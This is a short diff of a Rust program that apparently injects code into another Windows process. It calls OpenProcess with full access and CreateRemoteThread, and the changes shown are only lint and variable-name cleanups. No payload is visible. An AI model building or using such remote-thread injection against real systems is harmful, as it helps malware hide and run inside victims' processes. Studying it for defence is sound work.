@@ -14,6 +14,7 @@ use windows::Win32::System::Threading::{
     CreateRemoteThread, GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_ALL_ACCESS,
 };
 
+#[allow(unused_must_use, unused_variables)]
 fn main() {
     unsafe {
         let args: Vec<String> = env::args().collect();
@@ -79,7 +80,7 @@ fn main() {
                 }
 
                 println!("[+] CreateRemoteThread Executed!");
-                let _r_thread = CreateRemoteThread(
+                let r_thread = CreateRemoteThread(
                     proc,
                     None,
                     0,
@@ -88,7 +89,7 @@ fn main() {
                     0,
                     None,
                 );
-                let _ = CloseHandle(proc);
+                CloseHandle(proc);
             }
             Err(erro) => {
                 println!("[-] Error when performing OpenProcess");
